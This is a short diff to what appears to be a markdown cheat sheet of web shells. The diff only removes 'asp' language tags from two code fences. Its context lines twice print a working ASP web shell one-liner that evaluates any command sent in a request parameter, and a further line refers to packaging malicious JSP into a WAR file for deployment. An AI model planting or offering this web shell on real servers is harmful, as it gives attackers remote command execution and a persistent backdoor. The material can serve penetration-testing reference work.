@@ -192,7 +192,7 @@ PNG
 ```
 
 #### Minimal ASP Shell
-```asp
+```
 <% eval request("cmd") %>
 ```
 
@@ -384,7 +384,7 @@ Package malicious JSP in JAR/WAR file for deployment
 ```
 
 ### ASP One-liner
-```asp
+```
 <% eval request("cmd") %>
 ```
 
